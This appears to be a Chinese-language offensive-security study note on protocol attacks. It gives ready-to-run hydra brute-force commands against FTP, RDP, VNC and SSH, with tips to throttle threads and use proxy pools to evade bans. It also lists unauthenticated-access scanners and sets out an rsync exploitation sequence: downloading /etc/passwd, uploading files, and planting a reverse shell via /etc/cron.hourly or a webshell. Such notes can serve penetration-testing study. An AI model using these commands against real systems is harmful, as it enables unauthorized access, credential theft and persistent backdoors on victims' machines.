---
title: "协议安全：hydra爆破、未授权检测、桌面应用RCE"
pubDate: 2026-08-08
tags:
  - 安全
  - 协议
---

协议类漏洞打法就三种：弱口令爆破、未授权访问、承载软件 Nday。重点是 hydra 爆破各协议 + rsync 未授权利用

## 三种打法

- 弱口令爆破：用户用了弱口令就 hydra 跑
- 未授权访问：配置不当导致匿名能登
- 承载软件 Nday：比如 Wing FTP Server、IIS FTP 等爆过 RCE

## hydra 爆破

kali 自带，老牌协议爆破工具。常用参数：`-l` 用户名 / `-L` 用户字典，`-p` 密码 / `-P` 密码字典，`-s` 指定端口，`-e ns` 空密码/用户名=密码试探，`-t` 线程（默认16），`-f` 找到一个就停，`-V` 显示过程。同类还有 medusa、CrackMapExec

```
FTP：  hydra -l 用户名 -P 字典 IP ftp -V -t 4
RDP：  hydra -l administrator -P 字典 IP rdp -V -t 4
VNC：  hydra -P 字典 IP vnc -V -t 4
SSH：  hydra -l 用户名 -P 字典 IP ssh -V -t 4
```

坑：`-t` 一定设小（4 左右），太快容易被 ban 和超时；尽量挂代理池

各协议要点：
- RDP（3389）：Windows 独有，用户名基本固定 administrator
- VNC（5900）：跨系统远程桌面，无用户名只爆破密码，成功用 VNC Viewer 连
- SSH（22）：一般开着，但用公私钥认证的直接跑路，只有账号密码认证才能爆破

## 未授权访问检测

主要指协议类匿名登录。工具：

- unauthorizedV2（https://github.com/xk11z/unauthorized）
- UnauthorizedScan（https://github.com/phoenix118go/Unauthorized_VUL_GUI）升级版，支持自定义端口、批量、代理

## rsync 未授权（端口 873）

Linux 数据备份工具，默认 873。没配 ACL 或密码就能读写文件。判断：

```
rsync rsync://目标IP:873          # 有输出就是未授权
```

利用（只能列目录、下载、上传，不能直接读文件内容、不能覆盖）：

```
rsync rsync://目标IP:873/src                          # 列目录
rsync rsync://目标IP:873/src/etc/passwd ./            # 下载文件
rsync -av 本地文件 rsync://目标IP:873/src/文件路径      # 上传
```

写后门两种方式：目标有网站就传 webshell；没有就传计划任务反弹 shell

```
rsync -av shell rsync://目标IP:873/src/etc/cron.hourly
```

## 要点

协议类就记三个动作：hydra 爆弱口令（控制线程+挂代理）、工具扫未授权（unauthorizedV2/UnauthorizedScan）、碰承载软件查 Nday。rsync 未授权最值得记——列目录/下载/上传三件套，没法直接读文件但能传 cron 反弹。桌面应用漏洞图个思路。重点是 hydra 命令和 rsync 利用流程
